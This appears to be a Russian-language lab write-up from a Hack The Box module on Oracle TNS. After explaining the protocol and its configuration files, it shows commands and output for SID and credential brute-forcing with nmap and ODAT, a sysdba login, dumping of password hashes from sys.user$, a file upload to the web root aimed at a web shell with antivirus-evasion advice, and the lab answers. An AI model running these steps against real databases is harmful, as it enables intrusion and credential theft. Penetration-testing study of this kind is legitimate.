Oracle TNS







Сервер Oracle Transparent Network Substrate( TNS) — это протокол связи, обеспечивающий обмен данными между базами данных Oracle и приложениями по сети. Первоначально представленный как часть программного пакета Oracle Net Services , TNS поддерживает различные сетевые протоколы между базами данных Oracle и клиентскими приложениями, такие как стеки протоколов IPX/SPXи TCP/IP





TNS был обновлен для поддержки новых технологий, включая IPv6шифрование SSL/TLS





Кроме того, он обеспечивает шифрование связи между клиентом и сервером за счет дополнительного уровня безопасности поверх протокола TCP/IP





По умолчанию прослушиватель ожидает входящие соединения на порту TCP/1521





Прослушиватель TNS настроен на поддержку различных сетевых протоколов, включая TCP/IP, UDP, IPX/SPX, и AppleTalk



Прослушиватель также может поддерживать несколько сетевых интерфейсов и прослушивать определенные IP-адреса или все доступные сетевые интерфейсы. По умолчанию Oracle TNS можно удаленно управлять в Oracle 8i/, 9iно не в Oracle 10g/11g







##### ВАЖНО:

&nbsp;Файлы конфигурации для Oracle TNS называются tnsnames.oraи listener.ora и обычно находятся в $ORACLE\_HOME/network/admin каталоге.







&nbsp;в Oracle 9 используется пароль по умолчанию, CHANGE\_ON\_INSTALLтогда как в Oracle 10 пароль по умолчанию не установлен





Сервис Oracle DBSNMP также использует пароль по умолчанию, dbsnmp



Каждая база данных или служба имеет уникальную запись в файле tnsnames.ora





Запись включает в себя имя службы, сетевое расположение службы и имя базы данных или службы, которое клиенты должны использовать при подключении к службе. Например, простой tnsnames.ora файл может выглядеть так:



Код: txt

ORCL =

&nbsp; (DESCRIPTION =

&nbsp;   (ADDRESS\_LIST =

&nbsp;     (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))

&nbsp;   )

&nbsp;   (CONNECT\_DATA =

&nbsp;     (SERVER = DEDICATED)

&nbsp;     (SERVICE\_NAME = orcl)

&nbsp;   )

&nbsp; )







##### Listener.ora





Код: txt

SID\_LIST\_LISTENER =

&nbsp; (SID\_LIST =

&nbsp;   (SID\_DESC =

&nbsp;     (SID\_NAME = PDB1)

&nbsp;     (ORACLE\_HOME = C:\\oracle\\product\\19.0.0\\dbhome\_1)

&nbsp;     (GLOBAL\_DBNAME = PDB1)

&nbsp;     (SID\_DIRECTORY\_LIST =

&nbsp;       (SID\_DIRECTORY =

&nbsp;         (DIRECTORY\_TYPE = TNS\_ADMIN)

&nbsp;         (DIRECTORY = C:\\oracle\\product\\19.0.0\\dbhome\_1\\network\\admin)

&nbsp;       )

&nbsp;     )

&nbsp;   )

&nbsp; )



LISTENER =

&nbsp; (DESCRIPTION\_LIST =

&nbsp;   (DESCRIPTION =

&nbsp;     (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))

&nbsp;     (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))

&nbsp;   )

&nbsp; )



ADR\_BASE\_LISTENER = C:\\oracle









Базы данных Oracle можно защитить с помощью так называемого списка исключений PL/SQL (PL/SQL Exclusion List PlsqlExclusionList

Это создаваемый пользователем текстовый файл, который необходимо разместить в соответствующем $ORACLE\_HOME/sqldeveloper каталоге

После создания файла списка исключений PL/SQL его можно загрузить в экземпляр базы данных. Он служит черным списком, к которому нельзя получить доступ через сервер приложений Oracle



+--------------------+---------------------------------------------------------------------------------------------------+

| Параметр           | Описание                                                                                          |

+--------------------+---------------------------------------------------------------------------------------------------+

| DESCRIPTION        | Дескриптор, указывающий имя базы данных и тип подключения к ней                                   |

| ADDRESS            | Сетевой адрес базы данных, включающий имя хоста и номер порта                                     |

| PROTOCOL           | Сетевой протокол, используемый для связи с сервером                                               |

| PORT               | Номер порта, используемый для связи с сервером                                                    |

| CONNECT\_DATA       | Указывает атрибуты соединения, такие как имя службы или SID, протокол и идентификатор экземпляра  |

| INSTANCE\_NAME      | Имя экземпляра базы данных, к которому клиент хочет подключиться                                  |

| SERVICE\_NAME       | Название сервиса, к которому клиент хочет подключиться                                            |

| SERVER             | Тип сервера, используемого для подключения к базе данных (например, dedicated или shared)         |

| USER               | Имя пользователя, используемое для аутентификации на сервере базы данных                          |

| PASSWORD           | Пароль, используемый для аутентификации на сервере базы данных                                    |

| SECURITY           | Тип защиты соединения                                                                             |

| VALIDATE\_CERT      | Следует ли проверять сертификат с использованием SSL/TLS                                          |

| SSL\_VERSION        | Версия SSL/TLS, используемая для подключения                                                      |

| CONNECT\_TIMEOUT    | Ограничение по времени в секундах для установления соединения клиентом                            |

| RECEIVE\_TIMEOUT    | Ограничение по времени в секундах для получения ответа от базы данных                            |

| SEND\_TIMEOUT       | Ограничение по времени в секундах для отправки запроса клиентом                                   |

| SQLNET.EXPIRE\_TIME | Время в секундах, отведённое клиенту для обнаружения разрыва соединения                           |

| TRACE\_LEVEL        | Уровень трассировки для подключения к базе данных                                                 |

| TRACE\_DIRECTORY    | Каталог, где хранятся файлы трассировки                                                           |

| TRACE\_FILE\_NAME    | Название файла трассировки                                                                        |

| LOG\_FILE           | Файл, в котором хранится информация журнала.

+--------------------+---------------------------------------------------------------------------------------------------+









Oracle Database Attacking Tool ( ODAT) — это инструмент для тестирования на проникновение с открытым исходным кодом, написанный на Python и предназначенный для выявления и эксплуатации уязвимостей в базах данных Oracle





Сканированием порт по умолчанию

sudo nmap -p1521 -sV 10.129.204.235 --open









Администраторы баз данных могут использовать SID для мониторинга и управления отдельными экземплярами базы данных

они могут запускать, останавливать или перезапускать экземпляр, настраивать выделение памяти или другие параметры конфигурации, а также отслеживать его производительность с помощью таких инструментов, как Oracle Enterprise Manager









Nmap - SID Bruteforcing

SavitskiyES@htb\[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute





ODAT

все модули инструмента odat.py

SavitskiyES@htb\[/htb]$ ./odat.py all -s 10.129.204.235



\[+] Checking if target 10.129.204.235:1521 is well configured for a connection...

\[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...



...SNIP...



\[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 

\[!] Notice: 'oracle\_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 

\[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59

\[+] Valid credentials found: scott/tiger. Continue...



...SNIP...









нашли действительные учетные данные пользователя scottи его пароль tiger



После этого мы можем использовать инструмент sqlplusдля подключения к базе данных Oracle и взаимодействия с ней









SQLplus - Вход



SavitskiyES@htb\[/htb]$ sqlplus scott/tiger@10.129.204.235/XE



SQL\*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023

Version 21.4.0.0.0



Copyright (c) 1982, 2021, Oracle. All rights reserved.



ERROR:

ORA-28002: the password will expire within 7 days







Connected to:

Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production



SQL> 







Если вы столкнулись со следующей ошибкой sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, пожалуйста, выполните следующие действия, взятые отсюда(https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared)



Oracle TNS

SavitskiyES@htb\[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig







Взаимодействие с СУБД Oracle

SQL> select table\_name from all\_tables;



TABLE\_NAME

------------------------------

DUAL

SYSTEM\_PRIVILEGE\_MAP

TABLE\_PRIVILEGE\_MAP

STMT\_AUDIT\_OPTION\_MAP

AUDIT\_ACTIONS

WRR$\_REPLAY\_CALL\_FILTER

HS\_BULKLOAD\_VIEW\_OBJ

HS$\_PARALLEL\_METADATA

HS\_PARTITION\_COL\_NAME

HS\_PARTITION\_COL\_TYPE

HELP



...SNIP...





SQL> select \* from user\_role\_privs;



USERNAME                       GRANTED\_ROLE                   ADM DEF OS\_

------------------------------ ------------------------------ --- --- ---

SCOTT                          CONNECT                        NO  YES NO

SCOTT                          RESOURCE                       NO  YES NO















Oracle RDBMS - перечисление баз данных

SavitskiyES@htb\[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba



SQL\*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023

Version 21.4.0.0.0



Copyright (c) 1982, 2021, Oracle. All rights reserved.





Connected to:

Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production





SQL> select \* from user\_role\_privs;



USERNAME                       GRANTED\_ROLE                   ADM DEF OS\_

------------------------------ ------------------------------ --- --- ---

SYS                            ADM\_PARALLEL\_EXECUTE\_TASK      YES YES NO

SYS                            APEX\_ADMINISTRATOR\_ROLE        YES YES NO

SYS                            AQ\_ADMINISTRATOR\_ROLE          YES YES NO

SYS                            AQ\_USER\_ROLE                   YES YES NO

SYS                            AUTHENTICATEDUSER              YES YES NO

SYS                            CONNECT                        YES YES NO

SYS                            CTXAPP                         YES YES NO

SYS                            DATAPUMP\_EXP\_FULL\_DATABASE     YES YES NO

SYS                            DATAPUMP\_IMP\_FULL\_DATABASE     YES YES NO

SYS                            DBA                            YES YES NO

SYS                            DBFS\_ROLE                      YES YES NO



USERNAME                       GRANTED\_ROLE                   ADM DEF OS\_

------------------------------ ------------------------------ --- --- ---

SYS                            DELETE\_CATALOG\_ROLE            YES YES NO

SYS                            EXECUTE\_CATALOG\_ROLE           YES YES NO

...SNIP...









&nbsp;мы можем получить хэши паролей sys.user$и попытаться взломать их в автономном режиме. Запрос для этого будет выглядеть следующим образом





СУБД Oracle — Извлечение хэшей паролей



SQL> select name, password from sys.user$;



NAME                           PASSWORD

------------------------------ ------------------------------

SYS                            FBA343E7D6C8BC9D

PUBLIC

CONNECT

RESOURCE

DBA

SYSTEM                         B5073FE1DE351687

SELECT\_CATALOG\_ROLE

EXECUTE\_CATALOG\_ROLE

DELETE\_CATALOG\_ROLE

OUTLN                          4A3BA55E08595C81

EXP\_FULL\_DATABASE



NAME                           PASSWORD

------------------------------ ------------------------------

IMP\_FULL\_DATABASE

LOGSTDBY\_ADMINISTRATOR

...SNIP...











Другой вариант — загрузить веб-оболочку на целевой сервер

для этого требуется, чтобы на сервере работал веб-сервер, и нам нужно знать точное местоположение корневого каталога веб-сервера





можем попробовать пути по умолчанию, которые следующие:

+-------+---------------------------------+

| ОС    | Путь                            |

+-------+---------------------------------+

| Linux | /var/www/html                   |

| Windows | C:\\inetpub\\wwwroot            |

+-------+---------------------------------+









всегда важно попробовать наш подход к эксплуатации с файлами, которые не выглядят опасными для антивирусных программ или систем обнаружения/предотвращения вторжений. Поэтому мы создаём текстовый файл со строкой и используем его для загрузки в целевую систему





СУБД Oracle - Загрузка файла



SavitskiyES@htb\[/htb]$ echo "Oracle File Upload Test" > testing.txt

SavitskiyES@htb\[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt



\[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\\inetpub\\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  

\[+] The ./testing.txt file was created on the C:\\inetpub\\wwwroot directory on the 10.129.204.235 server like the testing.txt file







проверить, сработал ли способ загрузки файла curl. Для этого мы воспользуемся GET http://<IP>запросом или посетим сайт через браузер





SavitskiyES@htb\[/htb]$ curl -X GET http://10.129.204.235/testing.txt



Oracle File Upload Test









итого используем скрипт:
./odat.py all -s 10.129.205.19

находим логин/пароль


Подключаемся к базе:
sqlplus scott/tiger@//10.129.205.19:1521/XE as sysdba





смотрим доступные:
SELECT name FROM v$database;

Смотрим всех
SELECT username FROM dba\_users ORDER BY username;


выбираем конкретного:
SELECT name, password FROM sys.user$ WHERE name = 'DBSNMP';

получаем:
NAME			       PASSWORD

------------------------------ ------------------------------

DBSNMP			       E066D214D5421CCC









Перечислили целевую базу данных → XE (это и есть ответ на первую часть задачи).

SID = XE

Service Name = XE (и XEXDB)



Нашли валидные credentials → scott/tiger (через brute-force odat.py)

Установили Oracle Instant Client + sqlplus (самая долгая часть, но теперь ты можешь подключаться к любой Oracle-базе напрямую)

Подключились → scott/tiger@10.129.205.19:1521/XE

Увидели таблицы → EMP, DEPT, BONUS, SALGRADE (демонстрационная схема SCOTT)

Пытались вытащить хэш DBSNMP → из sys.user$ (это и есть вторая часть задачи)











































































